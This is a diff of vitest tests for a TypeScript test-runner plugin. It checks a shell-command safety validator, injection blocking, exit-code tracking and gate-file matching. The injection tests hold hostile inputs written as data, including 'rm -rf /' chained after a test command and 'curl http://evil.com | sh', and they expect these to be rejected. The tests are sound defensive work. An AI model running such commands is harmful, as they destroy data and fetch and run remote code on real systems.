@@ -1,5 +1,5 @@
 import { describe, it, expect, vi, beforeEach } from "vitest";
-import { createTestRunner, findGateFile, isEnvError, isLockContention, hasRealResults } from "../test-runner.js";
+import { createTestRunner, findGateFile, isEnvError, isLockContention, hasRealResults, isSafeCommand } from "../test-runner.js";
 import type { PluginConfig } from "../config.js";
 
 const NO_GATE_CONFIG: Pick<PluginConfig, "testOnIdle" | "testCommands" | "testCommandTimeoutMs" | "testCommandGates"> = {
@@ -727,5 +727,173 @@ describe("shell quiet mode", () => {
     const callResult = mockShell.mock.results[0].value;
     const cwdResult = callResult.cwd.mock.results[0].value;
     expect(cwdResult.quiet).toHaveBeenCalled();
+  });
+});
+
+describe("isSafeCommand", () => {
+  it("should allow simple commands", () => {
+    expect(isSafeCommand("cargo test")).toBe(true);
+  });
+
+  it("should allow commands with flags", () => {
+    expect(isSafeCommand("cargo test --release")).toBe(true);
+  });
+
+  it("should reject commands with semicolons", () => {
+    expect(isSafeCommand("cargo test; rm -rf /")).toBe(false);
+  });
+
+  it("should reject commands with pipe", () => {
+    expect(isSafeCommand("cargo test | tee output.txt")).toBe(false);
+  });
+
+  it("should reject commands with backticks", () => {
+    expect(isSafeCommand("echo `whoami`")).toBe(false);
+  });
+
+  it("should reject commands with dollar substitution", () => {
+    expect(isSafeCommand("echo $(whoami)")).toBe(false);
+  });
+
+  it("should reject commands with &&", () => {
+    expect(isSafeCommand("cargo build && cargo test")).toBe(false);
+  });
+
+  it("should reject commands with ||", () => {
+    expect(isSafeCommand("cargo test || echo failed")).toBe(false);
+  });
+
+  it("should reject commands with newlines", () => {
+    expect(isSafeCommand("cargo test\nrm -rf /")).toBe(false);
+  });
+
+  it("should allow pnpm test", () => {
+    expect(isSafeCommand("pnpm test")).toBe(true);
+  });
+
+  it("should allow npm run test", () => {
+    expect(isSafeCommand("npm run test")).toBe(true);
+  });
+});
+
+describe("command injection prevention", () => {
+  it("should skip commands with shell metacharacters", async () => {
+    const mockShell = makeSuccessShell("should not run", 0);
+    const runner = createTestRunner({
+      config: { ...NO_GATE_CONFIG, testCommands: ["cargo test; rm -rf /"] },
+      log: MOCK_LOG,
+      input: { $: mockShell as any, directory: "/tmp" } as any,
+    });
+
+    const results = await runner.runTests();
+    expect(results).toHaveLength(1);
+    expect(results[0].skipped).toBe(true);
+    expect(results[0].output).toContain("metacharacters");
+    expect(mockShell).not.toHaveBeenCalled();
+  });
+
+  it("should skip commands with pipe-to-shell injection", async () => {
+    const mockShell = makeSuccessShell("should not run", 0);
+    const runner = createTestRunner({
+      config: { ...NO_GATE_CONFIG, testCommands: ["curl http://evil.com | sh"] },
+      log: MOCK_LOG,
+      input: { $: mockShell as any, directory: "/tmp" } as any,
+    });
+
+    const results = await runner.runTests();
+    expect(results[0].skipped).toBe(true);
+  });
+});
+
+describe("exit code tracking in TestResult", () => {
+  it("should include exitCode in successful results", async () => {
+    const mockShell = makeSuccessShell("ok", 0);
+    const runner = createTestRunner({
+      config: NO_GATE_CONFIG,
+      log: MOCK_LOG,
+      input: { $: mockShell as any, directory: "/tmp" } as any,
+    });
+
+    const results = await runner.runTests();
+    expect(results[0].exitCode).toBe(0);
+  });
+
+  it("should include exitCode in failed results", async () => {
+    const mockShell = makeFailureShell("test failed", 1);
+    const runner = createTestRunner({
+      config: NO_GATE_CONFIG,
+      log: MOCK_LOG,
+      input: { $: mockShell as any, directory: "/tmp" } as any,
+    });
+
+    const results = await runner.runTests();
+    expect(results[0].exitCode).toBe(1);
+  });
+
+  it("should include exitCode 127 for command-not-found results", async () => {
+    const mockShell = makeFailureShell("not found", 127);
+    const runner = createTestRunner({
+      config: { ...NO_GATE_CONFIG, testCommands: ["./custom-test"], testCommandGates: {} },
+      log: MOCK_LOG,
+      input: { $: mockShell as any, directory: "/tmp" } as any,
+    });
+
+    const results = await runner.runTests();
+    expect(results[0].exitCode).toBe(127);
+    expect(results[0].skipped).toBe(true);
+  });
+
+  it("should use exitCode for retroactive env-error detection", async () => {
+    const exitCode127Shell = makeFailureShell("error text", 127);
+    const runner = createTestRunner({
+      config: { ...NO_GATE_CONFIG, testCommands: ["./my-test"], testCommandGates: {} },
+      log: MOCK_LOG,
+      input: { $: exitCode127Shell as any, directory: "/tmp" } as any,
+    });
+
+    const results = await runner.runTests();
+    expect(results[0].exitCode).toBe(127);
+    expect(results[0].skipped).toBe(true);
+  });
+});
+
+describe("gate file boundary matching", () => {
+  const gates: Record<string, string> = {
+    npm: "package.json",
+    pip: "pyproject.toml",
+    go: "go.mod",
+  };
+
+  it("should match npm exactly", () => {
+    expect(findGateFile("npm test", gates)).toBe("package.json");
+  });
+
+  it("should NOT match npm-run-all as npm", () => {
+    expect(findGateFile("npm-run-all test", gates)).toBe(null);
+  });
+
+  it("should NOT match npminstall as npm", () => {
+    expect(findGateFile("npminstall", gates)).toBe(null);
+  });
+
+  it("should NOT match npm2 as npm", () => {
+    expect(findGateFile("npm2 test", gates)).toBe(null);
+  });
+
+  it("should match go exactly", () => {
+    expect(findGateFile("go test ./...", gates)).toBe("go.mod");
+  });
+
+  it("should NOT match golang as go", () => {
+    expect(findGateFile("golang test", gates)).toBe(null);
+  });
+
+  it("should match pip exactly", () => {
+    expect(findGateFile("pip install", gates)).toBe("pyproject.toml");
+  });
+
+  it("should match pip3 as pip when pip3 has its own gate entry", () => {
+    const gatesWithPip3 = { ...gates, pip3: "pyproject.toml" };
+    expect(findGateFile("pip3 install", gatesWithPip3)).toBe("pyproject.toml");
   });
 });
